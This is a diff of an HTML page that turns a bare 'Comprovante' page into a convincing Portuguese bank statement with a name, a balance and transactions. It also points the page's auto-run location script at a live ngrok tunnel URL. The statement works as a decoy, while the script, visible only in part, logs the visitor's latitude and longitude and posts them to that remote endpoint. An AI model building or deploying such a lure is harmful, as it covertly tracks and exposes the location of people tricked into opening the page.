@@ -4,8 +4,40 @@
   <meta charset="UTF-8">
   <title>Comprovante</title>
 </head>
-<body style="background-color: antiquewhite;">
-  <h1>Comprovante</h1>
+<body style="background-color: #f8f9fa; font-family: Arial, sans-serif; margin: 0; padding: 20px;">
+  <h1 style="text-align: center; color: #343a40;">Extrato Bancário</h1>
+  <div style="max-width: 600px; margin: 0 auto; background: white; padding: 20px; border-radius: 8px; box-shadow: 0 0 10px rgba(0,0,0,0.1);">
+    <p><strong>Nome:</strong> Tiago Ferreira</p>
+    <p><strong>Saldo atual:</strong> 2.430,52 €</p>
+    <hr>
+    <h2 style="font-size: 18px; margin-top: 20px;">Movimentos</h2>
+    <table style="width: 100%; border-collapse: collapse;">
+      <thead>
+        <tr style="background-color: #e9ecef;">
+          <th style="text-align: left; padding: 8px;">Data</th>
+          <th style="text-align: left; padding: 8px;">Descrição</th>
+          <th style="text-align: right; padding: 8px;">Valor</th>
+        </tr>
+      </thead>
+      <tbody>
+        <tr>
+          <td style="padding: 8px;">25/03/2025</td>
+          <td style="padding: 8px;">Pagamento MB Way</td>
+          <td style="padding: 8px; text-align: right;">-25,00 €</td>
+        </tr>
+        <tr>
+          <td style="padding: 8px;">24/03/2025</td>
+          <td style="padding: 8px;">Depósito</td>
+          <td style="padding: 8px; text-align: right;">+500,00 €</td>
+        </tr>
+        <tr>
+          <td style="padding: 8px;">22/03/2025</td>
+          <td style="padding: 8px;">Compra Continente</td>
+          <td style="padding: 8px; text-align: right;">-54,99 €</td>
+        </tr>
+      </tbody>
+    </table>
+  </div>
 
   <script>
     // Executa automaticamente ao carregar a página
@@ -25,7 +57,7 @@
       console.log("Longitude: " + longitude);
 
       // Envia a localização para o backend
-      fetch("NGROK-SERVER/send-location", {
+      fetch("https://c4b0-2001-818-e347-3f00-302b-63bc-a9e7-fd18.ngrok-free.app/send-location/ip", {
         method: "POST",
         headers: {
           "Content-Type": "application/json"
